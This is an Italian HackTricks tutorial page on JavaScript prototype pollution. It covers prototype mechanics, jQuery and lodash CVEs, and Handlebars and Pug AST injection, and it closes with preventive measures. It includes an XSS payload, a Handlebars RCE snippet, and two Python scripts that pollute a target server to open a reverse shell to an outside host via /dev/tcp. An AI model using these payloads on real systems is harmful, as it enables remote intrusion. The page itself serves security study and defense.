# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Oggetti in JavaScript <a href="#053a" id="053a"></a>

Gli oggetti in JavaScript sono essenzialmente collezioni di coppie chiave-valore, note come propriet√†. Un oggetto pu√≤ essere creato utilizzando `Object.create` con `null` come argomento per produrre un oggetto vuoto. Questo metodo consente la creazione di un oggetto senza propriet√† ereditate.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Un oggetto vuoto √® simile a un dizionario vuoto, rappresentato come `{}`.

### Funzioni e Classi in JavaScript

In JavaScript, le funzioni e le classi sono strettamente collegate, con le funzioni che spesso fungono da costruttori per le classi. Nonostante la mancanza di supporto nativo alle classi in JavaScript, i costruttori possono emulare il comportamento delle classi.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipi in JavaScript

JavaScript consente la modifica, l'aggiunta o la cancellazione degli attributi del prototipo durante l'esecuzione. Questa flessibilit√† consente l'estensione dinamica delle funzionalit√† di una classe.

Funzioni come `toString` e `valueOf` possono essere modificate per cambiare il loro comportamento, dimostrando la natura adattabile del sistema di prototipi di JavaScript.

## Ereditariet√†

Nella programmazione basata sui prototipi, le propriet√†/metodi vengono ereditati dagli oggetti dalle classi. Queste classi vengono create aggiungendo propriet√†/metodi a un'istanza di un'altra classe o a un oggetto vuoto.

Va notato che quando una propriet√† viene aggiunta a un oggetto che funge da prototipo per altri oggetti (come `myPersonObj`), gli oggetti che ereditano ottengono accesso a questa nuova propriet√†. Tuttavia, questa propriet√† non viene visualizzata automaticamente a meno che non venga esplicitamente invocata.

## Inquinamento del \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

## Esplorazione dell'inquinamento del prototipo in JavaScript

Gli oggetti JavaScript sono definiti da coppie chiave-valore e ereditano dal prototipo di oggetto JavaScript. Ci√≤ significa che la modifica del prototipo di oggetto pu√≤ influenzare tutti gli oggetti nell'ambiente.

Utilizziamo un esempio diverso per illustrare:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
L'accesso al prototipo dell'oggetto √® possibile attraverso:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Aggiungendo propriet√† al prototipo Object, ogni oggetto JavaScript erediter√† queste nuove propriet√†:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## Inquinamento del prototipo

Per uno scenario in cui l'uso di `__proto__` √® limitato, modificare il prototipo di una funzione √® un'alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Questo influisce solo sugli oggetti creati dal costruttore `Vehicle`, conferendo loro le propriet√† `beep`, `hasWheels`, `honk` e `isElectric`.

Due metodi per influenzare globalmente gli oggetti JavaScript attraverso l'inquinamento del prototipo includono:

1. Inquinare direttamente l'`Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Inquinare il prototipo di un costruttore per una struttura comunemente utilizzata:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Dopo queste operazioni, ogni oggetto JavaScript pu√≤ eseguire i metodi `goodbye` e `greet`.

## Inquinamento di altri oggetti

### Da una classe a Object.prototype

In uno scenario in cui √® possibile inquinare un oggetto specifico e si desidera arrivare a `Object.prototype`, √® possibile cercarlo con un codice simile al seguente:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Inquinamento degli elementi dell'array

Nota che, poich√© √® possibile inquinare gli attributi degli oggetti in JS, se hai accesso per inquinare un array, puoi anche **inquinare i valori dell'array** accessibili **tramite indici** (nota che non puoi sovrascrivere i valori, quindi devi inquinare gli indici che vengono in qualche modo utilizzati ma non scritti).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Inquinamento degli elementi HTML

Quando si genera un elemento HTML tramite JS, √® possibile **sovrascrivere** l'attributo **`innerHTML`** per farlo scrivere **codice HTML arbitrario**. [Idea ed esempio tratti da questo articolo](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Esempi

### Esempio di base

La pollution del prototipo si verifica a causa di una falla nell'applicazione che consente di sovrascrivere le propriet√† su `Object.prototype`. Ci√≤ significa che poich√© la maggior parte degli oggetti deriva le loro propriet√† da `Object.prototype`

L'esempio pi√π semplice √® aggiungere un valore a un **attributo non definito di un oggetto** che verr√† controllato, come:
```javascript
if (user.admin) {
```
Se l'attributo **`admin` √® indefinito**, √® possibile sfruttare una PP e impostarlo su True con qualcosa del genere:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Il meccanismo dietro a questo coinvolge la manipolazione delle propriet√† in modo tale che se un attaccante ha il controllo su determinati input, pu√≤ modificare il prototipo di tutti gli oggetti nell'applicazione. Questa manipolazione di solito coinvolge l'impostazione della propriet√† `__proto__`, che, in JavaScript, √® sinonimo di modifica diretta del prototipo di un oggetto.

Le condizioni in cui questo attacco pu√≤ essere eseguito con successo, come descritto in uno specifico [studio](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), includono:

- Eseguire una fusione ricorsiva.
- Definire propriet√† basate su un percorso.
- Clonare oggetti.


### Sovrascrittura di funzioni
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution per RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Proto Pollution lato client per XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Attacco di proto pollution tramite jQuery $ .extend

[Per ulteriori dettagli consulta questo articolo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
In jQuery, la funzione `$ .extend` pu√≤ portare a una proto pollution se la funzionalit√† di copia profonda viene utilizzata in modo improprio. Questa funzione viene comunemente utilizzata per clonare oggetti o unire propriet√† da un oggetto predefinito. Tuttavia, quando viene configurata in modo errato, le propriet√† destinate a un nuovo oggetto possono essere assegnate al prototipo invece. Ad esempio:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Questa vulnerabilit√†, identificata come CVE-2019-11358, illustra come una copia profonda possa modificare involontariamente il prototipo, portando a potenziali rischi per la sicurezza, come l'accesso amministrativo non autorizzato se le propriet√† come `isAdmin` vengono verificate senza una corretta verifica dell'esistenza.

### CVE-2018-3721, CVE-2019-10744: Attacco di inquinamento del prototipo tramite lodash

[Per ulteriori dettagli consulta questo articolo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) ha riscontrato vulnerabilit√† simili di inquinamento del prototipo (CVE-2018-3721, CVE-2019-10744). Questi problemi sono stati risolti nella versione 4.17.11.

### Un altro tutorial con CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Inquinamento del prototipo AST in NodeJS

NodeJS utilizza ampiamente gli Abstract Syntax Trees (AST) in JavaScript per funzionalit√† come i motori di template e TypeScript. Questa sezione esplora le vulnerabilit√† legate all'inquinamento del prototipo nei motori di template, in particolare Handlebars e Pug.

#### Analisi della vulnerabilit√† di Handlebars

Il motore di template Handlebars √® suscettibile a un attacco di inquinamento del prototipo. Questa vulnerabilit√† deriva da specifiche funzioni all'interno del file `javascript-compiler.js`. Ad esempio, la funzione `appendContent` concatena `pendingContent` se presente, mentre la funzione `pushSource` reimposta `pendingContent` su `undefined` dopo aver aggiunto la sorgente.

##### Processo di sfruttamento

Lo sfruttamento sfrutta l'AST (Abstract Syntax Tree) prodotto da Handlebars, seguendo questi passaggi:

1. **Manipolazione del parser**: Inizialmente, il parser, tramite il nodo `NumberLiteral`, impone che i valori siano numerici. L'inquinamento del prototipo pu√≤ aggirare questa restrizione, consentendo l'inserimento di stringhe non numeriche.
2. **Gestione da parte del compilatore**: Il compilatore pu√≤ elaborare un oggetto AST o un template di stringa. Se `input.type` √® uguale a `Program`, l'input viene trattato come pre-analizzato, il che pu√≤ essere sfruttato.
3. **Iniezione di codice**: Attraverso la manipolazione di `Object.prototype`, √® possibile iniettare codice arbitrario nella funzione del template, il che pu√≤ portare all'esecuzione remota di codice.

Un esempio che dimostra lo sfruttamento della vulnerabilit√† di Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Questo codice mostra come un attaccante potrebbe iniettare del codice arbitrario in un template Handlebars.

**Riferimento esterno**: √à stato riscontrato un problema legato all'inquinamento del prototipo nella libreria 'flat', come descritto qui: [Problema su GitHub](https://github.com/hughsk/flat/issues/105).

**Riferimento esterno**: [Problema legato all'inquinamento del prototipo nella libreria 'flat'](https://github.com/hughsk/flat/issues/105)

Esempio di exploit di inquinamento del prototipo in Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilit√† di Pug

Pug, un altro motore di template, affronta un rischio simile di inquinamento del prototipo. Informazioni dettagliate sono disponibili nella discussione su [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Esempio di inquinamento del prototipo in Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Misure preventive

Per ridurre il rischio di inquinamento del prototipo, possono essere adottate le seguenti strategie:

1. **Immutabilit√† degli oggetti**: `Object.prototype` pu√≤ essere reso immutabile applicando `Object.freeze`.
2. **Validazione dell'input**: gli input JSON devono essere rigorosamente validati rispetto allo schema dell'applicazione.
3. **Funzioni di merge sicure**: evitare l'uso non sicuro di funzioni di merge ricorsive.
4. **Oggetti senza prototipo**: √® possibile creare oggetti senza propriet√† del prototipo utilizzando `Object.create(null)`.
5. **Utilizzo di Map**: invece di `Object`, dovrebbe essere utilizzata `Map` per memorizzare coppie chiave-valore.
6. **Aggiornamenti delle librerie**: le patch di sicurezza possono essere incorporate aggiornando regolarmente le librerie.
7. **Linter e strumenti di analisi statica**: utilizzare strumenti come ESLint con plugin appropriati per rilevare e prevenire vulnerabilit√† di inquinamento del prototipo.
8. **Revisioni del codice**: implementare revisioni del codice approfondite per identificare e risolvere potenziali rischi legati all'inquinamento del prototipo.
9. **Formazione sulla sicurezza**: educare gli sviluppatori sui rischi dell'inquinamento del prototipo e sulle migliori pratiche per scrivere codice sicuro.
10. **Utilizzo cauto delle librerie**: fare attenzione nell'utilizzo di librerie di terze parti. Valutare la loro postura di sicurezza e revisionare il loro codice, soprattutto quelli che manipolano oggetti.
11. **Protezione in tempo di esecuzione**: utilizzare meccanismi di protezione in tempo di esecuzione, come l'utilizzo di pacchetti npm focalizzati sulla sicurezza che possono rilevare e prevenire attacchi di inquinamento del prototipo.

## Riferimenti

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
